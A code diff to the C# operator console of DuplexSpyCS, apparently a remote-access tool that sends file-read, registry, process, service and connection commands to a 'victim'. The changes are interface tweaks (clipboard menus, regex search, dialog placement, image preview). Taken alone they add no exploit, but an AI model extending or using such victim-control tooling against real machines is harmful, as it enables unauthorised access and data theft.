@@ -18,8 +18,10 @@ using ICSharpCode.TextEditor.Document;
 using Microsoft.Win32;
 using System.Data;
 using System.Diagnostics;
+using System.Text;
 using System.Text.Json;
 using System.Text.RegularExpressions;
+using System.Xml.Linq;
 
 namespace DuplexSpyCS
 {
@@ -73,8 +75,10 @@ namespace DuplexSpyCS
         private List<string[]> l_CopyClipboard = new List<string[]>(); //Array, 0: dir/file; 1: full path.
         private List<string[]> l_CutClipboard = new List<string[]>();
 
-        private List<ListViewItem> g_lsTaskLv;
-        private List<ListViewItem> g_lsServLv;
+        private List<ListViewItem> m_lsTaskLv = new List<ListViewItem>();
+        private List<ListViewItem> m_lsServLv = new List<ListViewItem>();
+        private List<ListViewItem> m_lsConnLv = new List<ListViewItem>();
+        private List<ListViewItem> m_lsWindowLv = new List<ListViewItem>();
 
         //Config
         private SettingConfig mgrConfig => clsStore.settingConfig;
@@ -92,7 +96,7 @@ namespace DuplexSpyCS
             if (!clsTools.fnbVictimEquals(victim, m_victim))
                 return;
 
-            
+
         }
 
         #region Global Function
@@ -671,6 +675,7 @@ namespace DuplexSpyCS
             if (szValKind == "REG_SZ")
             {
                 frmRegEditString f = new frmRegEditString();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.regFullPath = Reg_GetCurrentPath();
                 f.valName = items[0].Text;
                 f.valData = items[0].SubItems[2].Text;
@@ -680,6 +685,7 @@ namespace DuplexSpyCS
             else if (szValKind == "REG_MULTI_SZ")
             {
                 frmRegEditMultiString f = new frmRegEditMultiString();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.regFullPath = Reg_GetCurrentPath();
                 f.valName = items[0].Text;
                 f.valData = items[0].SubItems[2].Text;
@@ -689,6 +695,7 @@ namespace DuplexSpyCS
             else if (szValKind == "REG_EXPAND_SZ")
             {
                 frmRegEditString f = new frmRegEditString();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.regFullPath = Reg_GetCurrentPath();
                 f.valName = items[0].Text;
                 f.valData = items[0].SubItems[2].Text;
@@ -698,6 +705,7 @@ namespace DuplexSpyCS
             else if (szValKind == "REG_BINARY")
             {
                 frmRegEditBinary f = new frmRegEditBinary();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.regFullPath = Reg_GetCurrentPath();
                 f.Text = "Edit Binary";
                 f.ShowDialog();
@@ -705,6 +713,7 @@ namespace DuplexSpyCS
             else if (szValKind == "REG_DWORD" || szValKind == "REG_QWORD")
             {
                 frmRegEditWord f = new frmRegEditWord();
+                f.StartPosition = FormStartPosition.CenterScreen;
                 f.regFullPath = Reg_GetCurrentPath();
                 f.valName = items[0].Text;
                 f.valData = int.Parse(items[0].SubItems[2].Text, System.Globalization.NumberStyles.HexNumber);
@@ -1113,7 +1122,10 @@ namespace DuplexSpyCS
                 if (objs.Length == 2 && objs[1] == "f")
                 {
                     string path = objs[0];
-                    m_victim.fnSendCommand($"file|read|" + clsCrypto.b64E2Str(path));
+                    if (clsTools.FileIsImage(path))
+                        m_victim.fnSendCommand($"file|img|{clsCrypto.b64E2Str(path)}");
+                    else
+                        m_victim.fnSendCommand($"file|read|" + clsCrypto.b64E2Str(path));
                 }
             }));
         }
@@ -1759,15 +1771,59 @@ namespace DuplexSpyCS
         public void TaskInit(string data)
         {
             Invoke(new Action(
-                () => listView2.Columns.AddRange(
+                () =>
+                {
+                    listView2.Columns.AddRange(
                     dic_fields["task"].Select(
                         x => new ColumnHeader()
                         {
                             Width = 120,
                             Text = x,
                         }
-                    ).ToArray()
-                )
+                    ).ToArray());
+
+                    toolStripMenuItem75.DropDownItems.Add("All");
+                    toolStripMenuItem75.DropDownItems.Add(new ToolStripSeparator());
+
+                    toolStripMenuItem75.DropDownItems.Cast<ToolStripItem>().First().Click += (s, e) =>
+                    {
+                        var items = listView2.SelectedItems.Cast<ListViewItem>().ToList();
+                        if (items.Count == 0)
+                            return;
+
+                        StringBuilder sb = new StringBuilder();
+                        foreach (var item in items)
+                        {
+                            sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));
+                        }
+
+                        Clipboard.SetText(sb.ToString());
+                    };
+                    
+                    for (int i = 0; i < dic_fields["task"].Length; i++)
+                    {
+                        string szName = dic_fields["task"][i];
+                        int nIdx = i;
+
+                        ToolStripMenuItem item = new ToolStripMenuItem(szName);
+
+                        toolStripMenuItem75.DropDownItems.Add(item);
+                        item.Click += (s, e) =>
+                        {
+                            var items = listView2.SelectedItems.Cast<ListViewItem>().ToList();
+                            if (items.Count == 0)
+                                return;
+
+                            StringBuilder sb = new StringBuilder();
+                            foreach (var item in items)
+                            {
+                                sb.AppendLine(item.SubItems[nIdx].Text);
+                            }
+
+                            Clipboard.SetText(sb.ToString());
+                        };
+                    }
+                }
             ));
 
             bool column_changed = false;
@@ -1816,8 +1872,8 @@ namespace DuplexSpyCS
 
             Invoke(new Action(() =>
             {
-                g_lsTaskLv = listView2.Items.Cast<ListViewItem>().ToList();
-                toolStripStatusLabel3.Text = $"Process[{g_lsTaskLv.Count}]";
+                m_lsTaskLv = listView2.Items.Cast<ListViewItem>().ToList();
+                toolStripStatusLabel3.Text = $"Process[{m_lsTaskLv.Count}]";
             }));
         }
         /// <summary>
@@ -1864,7 +1920,7 @@ namespace DuplexSpyCS
         private void Task_RegexSearch(string szPattern)
         {
             listView2.Items.Clear();
-            foreach (ListViewItem item in g_lsTaskLv)
+            foreach (ListViewItem item in m_lsTaskLv)
             {
                 for (int i = 0; i < item.SubItems.Count; i++)
                 {
@@ -1937,8 +1993,8 @@ namespace DuplexSpyCS
 
             Invoke(new Action(() =>
             {
-                g_lsServLv = listView3.Items.Cast<ListViewItem>().ToList();
-                toolStripStatusLabel1.Text = $"Service[{g_lsServLv.Count}]";
+                m_lsServLv = listView3.Items.Cast<ListViewItem>().ToList();
+                toolStripStatusLabel1.Text = $"Service[{m_lsServLv.Count}]";
             }));
         }
         private string[] Serv_GetNames()
@@ -1966,9 +2022,9 @@ namespace DuplexSpyCS
         private void Serv_RegexSearch(string szPattern)
         {
             listView3.Items.Clear();
-            foreach (ListViewItem item in g_lsServLv)
+            foreach (ListViewItem item in m_lsServLv)
             {
-                for (int i = 0; i < g_lsServLv.Count; i++)
+                for (int i = 0; i < m_lsServLv.Count; i++)
                 {
                     try
                     {
@@ -2020,6 +2076,14 @@ namespace DuplexSpyCS
 
                 Invoke(new Action(() => listView4.Items.Add(item)));
             }
+
+            Invoke(new Action(() =>
+            {
+                m_lsConnLv.Clear();
+                m_lsConnLv.AddRange(listView4.Items.Cast<ListViewItem>().ToList());
+
+                toolStripLabel3.Text = $"Connection[{listView4.Items.Count}]";
+            }));
         }
 
         #endregion
@@ -2032,6 +2096,14 @@ namespace DuplexSpyCS
             clsStore.il_extension.ColorDepth = ColorDepth.Depth32Bit;
             clsStore.il_extension.Images.Add("folder", imageList1.Images[0]);
             tabControl2.SelectedIndex = 1;
+
+            toolStripComboBox1.Items.Add("All");
+            for (int i = 0; i < listView4.Columns.Count; i++)
+                toolStripComboBox1.Items.Add(listView4.Columns[i].Text);
+
+
+
+            toolStripComboBox1.SelectedIndex = 0;
 
             //Reg
             treeView3.SelectedImageIndex = 10;
@@ -3177,6 +3249,69 @@ namespace DuplexSpyCS
         private void frmManager_FormClosed(object sender, FormClosedEventArgs e)
         {
             //m_victim.m_listener.ReceivedDecoded -= fnRecm_victim;
+        }
+
+        private void listView4_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.Modifiers == Keys.Control)
+            {
+                if (e.KeyCode == Keys.A)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                        item.Selected = true;
+                }
+            }
+            else
+            {
+                if (e.KeyCode == Keys.F5)
+                {
+                    Conn_ReqInit();
+                }
+            }
+        }
+
+        private void toolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                listView4.Items.Clear();
+
+                try
+                {
+                    if (toolStripComboBox1.SelectedIndex == 0)
+                    {
+                        foreach (ListViewItem item in m_lsConnLv)
+                        {
+                            foreach (var sub in item.SubItems.Cast<ListViewItem.ListViewSubItem>())
+                            {
+                                if (Regex.IsMatch(sub.Text, toolStripTextBox1.Text))
+                                {
+                                    listView4.Items.Add(item);
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                    else
+                    {
+                        int nIdx = toolStripComboBox1.SelectedIndex - 1;
+                        foreach (ListViewItem item in m_lsConnLv)
+                        {
+                            if (Regex.IsMatch(item.Text, toolStripTextBox1.Text))
+                            {
+                                listView4.Items.Add(item);
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, "Search", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    listView4.Items.AddRange(m_lsConnLv.ToArray());
+                }
+
+                toolStripLabel3.Text = $"Connection[{listView4.Items.Count}]";
+            }
         }
     }
 }
